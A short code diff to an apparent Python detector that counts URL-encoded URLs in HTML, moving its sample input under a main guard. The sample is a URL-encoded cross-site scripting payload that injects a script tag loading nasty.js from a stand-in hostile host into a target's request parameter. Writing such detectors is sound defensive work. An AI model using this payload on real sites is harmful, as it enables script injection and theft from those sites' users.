@@ -37,11 +37,12 @@ def calculate_score(html_content):
     return encoded_urls_count
 
 
-html_content = """
-http://target/getdata.php?data=%3cscript%20
-src=%22http%3a%2f%2fwww.badplace.com%2fnasty
-.js%22%3e%3c%2fscript%3e
-"""
+if __name__ == "__main__":
+    html_content = """
+    http://target/getdata.php?data=%3cscript%20
+    src=%22http%3a%2f%2fwww.badplace.com%2fnasty
+    .js%22%3e%3c%2fscript%3e
+    """
 
-score = calculate_score(html_content)
-print("Encoded URL count:", score)
+    score = calculate_score(html_content)
+    print("Encoded URL count:", score)
